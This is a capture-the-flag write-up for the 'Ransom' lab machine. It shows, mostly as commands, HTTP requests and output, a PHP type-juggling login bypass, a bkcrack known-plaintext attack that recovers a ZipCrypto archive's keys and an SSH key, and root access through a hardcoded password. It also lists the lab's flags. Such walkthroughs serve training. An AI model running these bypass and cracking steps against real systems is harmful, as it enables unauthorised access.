# Ransom

# Enumeration

````
# nmap -sV --top-ports 100 10.10.11.153 -oA nmap-10.10.11.153-sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 06:13 EDT
Nmap scan report for 10.10.11.153
Host is up (0.15s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
````

The application sends a GET request to /api/login?password=<passwd> to login in the application.

````http
GET /api/login?password=blah HTTP/1.1
Host: ransom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://ransom.htb/login
Cookie: XSRF-TOKEN=eyJpdiI6Im9zRXJmTDJMbG1EZW1iT0IxcG5tV2c9PSIsInZhbHVlIjoiU3phYktmZTA3YW9jN0dITmZzTGJ3SFp4d1hONjNlZFhPdVNMNmI2MTF6elkvbSs3bllVUHQwMEYwUE9HN1l4VXpnZjhPZ0IycGlMUlk0VmN6YWR2N243RjJmQ0YxZW5JZi82dW5hbk16WVlSQWhnNXE2djREaERmd1FxLzZneS8iLCJtYWMiOiI5ZmIxYjhmMmFhOWNlMThhNjAxNTQ4NzIxYmZmZGViNGMwMDYxNTdhOGNhY2UxNDVhNzA1OGM0N2ZjYWFkNTY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlcrQ1lmQXJYa3NNL3dOejVDTW9BVVE9PSIsInZhbHVlIjoidlJ3YmJGY241TmlibUlPVjFPOWlUelRUMWE4QVVVWGRhZlhKZnR4QXNTcUg3UDNoRWZNNGVKOGpCbnJUSFBOUy8rZk1JOHBCVEVpbkZHa3Q4bWV1K2tvUUI5M2FMTTFSTTNabjVuaE5VdDEvRUcvMHBPdUVQK0JYZ0luREtCMkgiLCJtYWMiOiJmNTAzNjE2YjNhYTgxODY1ZTVjMTc0M2ExMDA5ZTA5MWNhZGNhODc5M2JhOGFmMjk0YzE1MzI5NDA5YzFjNTVmIiwidGFnIjoiIn0%3D


````

  


  
# User
  
There is a [Type Juggling == vs ===](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) vulnerability in the application that can be exploited.

The application allows GET and HEAD method but also allows JSON on body, changing the password to TRUE (or 0) would make the internal comparision on php match.

````http
GET /api/login HTTP/1.1
Host: ransom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://ransom.htb/login
Cookie: XSRF-TOKEN=eyJpdiI6Im9zRXJmTDJMbG1EZW1iT0IxcG5tV2c9PSIsInZhbHVlIjoiU3phYktmZTA3YW9jN0dITmZzTGJ3SFp4d1hONjNlZFhPdVNMNmI2MTF6elkvbSs3bllVUHQwMEYwUE9HN1l4VXpnZjhPZ0IycGlMUlk0VmN6YWR2N243RjJmQ0YxZW5JZi82dW5hbk16WVlSQWhnNXE2djREaERmd1FxLzZneS8iLCJtYWMiOiI5ZmIxYjhmMmFhOWNlMThhNjAxNTQ4NzIxYmZmZGViNGMwMDYxNTdhOGNhY2UxNDVhNzA1OGM0N2ZjYWFkNTY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlcrQ1lmQXJYa3NNL3dOejVDTW9BVVE9PSIsInZhbHVlIjoidlJ3YmJGY241TmlibUlPVjFPOWlUelRUMWE4QVVVWGRhZlhKZnR4QXNTcUg3UDNoRWZNNGVKOGpCbnJUSFBOUy8rZk1JOHBCVEVpbkZHa3Q4bWV1K2tvUUI5M2FMTTFSTTNabjVuaE5VdDEvRUcvMHBPdUVQK0JYZ0luREtCMkgiLCJtYWMiOiJmNTAzNjE2YjNhYTgxODY1ZTVjMTc0M2ExMDA5ZTA5MWNhZGNhODc5M2JhOGFmMjk0YzE1MzI5NDA5YzFjNTVmIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 18

{ "password":true}
````

The web page has the first flag http://ransom.htb/user.txt, and also a encrypted zip archive (http://ransom.htb/uploaded-file-3422.zip)

7zip/7-zip has a technical mode to show more information from a file that can be used to discover the mechanism used to cipher the archive.

````
# 7z l -slt uploaded-file-3422.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: uploaded-file-3422.zip

--
Path = uploaded-file-3422.zip
Type = zip
Physical Size = 7735

----------
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 08:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
````

The ZipCrypto Deflate is vulnerable to [known plaintext attack](https://en.wikipedia.org/wiki/Known-plaintext_attack). The attack can be made with [bkcrack](https://github.com/kimci86/bkcrack) the only thing you need is a entire file that matches the CRC from the encrypted archive. The 7zip CRC value is the value of the uncompressed file.
  
````python
import binascii
with open('file_blah', 'wb') as f:
  data = b'# ~/.bash_logout: executed by bash(1) when login shell exits.\n\n# when leaving the console clear the screen to increase privacy\n\nif [ "$SHLVL" = 1 ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n'
  f.write(data)
  hex(binascii.crc32(data) & 0xFFFFFFFF)  
````

  bkcrack options:
  ````
  -C: the encrypted zip file
  -c: the name of the encrypted but known file in the zip
  -P: an unencrypted zip with the file in it
  -p: the name of the file in the unencrypted zip
  ````
  
  ````
  $ bkcrack -C uploaded-file-3422.zip -c .bash_logout -P file_blah.zip -p file_blah
  bkcrack 1.3.5 - 2022-03-06
  [07:39:49] Z reduction using 150 bytes of known plaintext
  0.0 % (0 / 150) 
  100.0 % (150 / 150)
  [07:39:50] Attack on 57097 Z values at index 7
  Keys: 7b549874 ebc25ec5 7e465e18
  78.5 % (44845 / 57097)
  [07:44:34] Keys
  7b549874 ebc25ec5 7e465e18
  ````

   bkcrack options 2:
  ````
    -C: encrypted archive
    -k: keys from above
    -U: output archive name
    password: output archive password (new password to decompress the file)
  ````
  
  ````
   /opt/bkcrack-1.3.5-Linux/bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U output.zip passwd
    bkcrack 1.3.5 - 2022-03-06
    [08:05:45] Writing unlocked archive output.zip with password "passwd"
    100.0 % (9 / 9)
    Wrote unlocked archive
  ````
  
  ````
  # unzip output.zip -d output_files        <PASSWORD: passwd>
Archive:  output.zip
[output.zip] .bash_logout password: 
  inflating: output_files/.bash_logout  
  inflating: output_files/.bashrc    
  inflating: output_files/.profile   
   creating: output_files/.cache/
 extracting: output_files/.cache/motd.legal-displayed  
 extracting: output_files/.sudo_as_admin_successful  
   creating: output_files/.ssh/
  inflating: output_files/.ssh/id_rsa  
  inflating: output_files/.ssh/authorized_keys  
  inflating: output_files/.ssh/id_rsa.pub  
  inflating: output_files/.viminfo
  ````
  
# Root
  
  Root password is the one used to check the first login page, it is cleartext written in the source code of the backend.
  ````php
      /**
     * Handle account login
     * 
     */
    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);

        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }

        return "Invalid Password";
    }
  ````

  ````
  htb@ransom:~$ su - root
Password: 
root@ransom:~# ls
root.txt
root@ransom:~# cat root.txt 
6d197387cb7f92184565cbe7850ee013
  ````
  
# Secrets
  
  * FLAG_USER = 34b36fdef7651ea726d6dd00d83678cb
  * FLAG_ROOT = 6d197387cb7f92184565cbe7850ee013
  
https://0xdf.gitlab.io/2022/03/15/htb-ransom.html
